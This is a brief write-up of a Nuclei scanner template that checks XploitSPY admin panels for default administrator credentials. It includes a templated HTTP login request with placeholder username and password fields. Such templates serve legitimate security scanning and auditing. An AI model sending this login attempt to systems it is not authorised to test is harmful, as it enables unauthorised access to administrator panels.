# Nuclei Template: XploitSPY - Default Login
**Template ID:** xploitspy-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`xploitspy-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Default login and password to access administrator panel

## Steps to reproduce / Exploit Payload
```http
POST /login HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Referer: {{RootURL}}/login

username={{user}}&password={{pass}}&hostname={{Hostname}}
```

## References
- https://github.com/XploitWizer-Community/XploitSPY
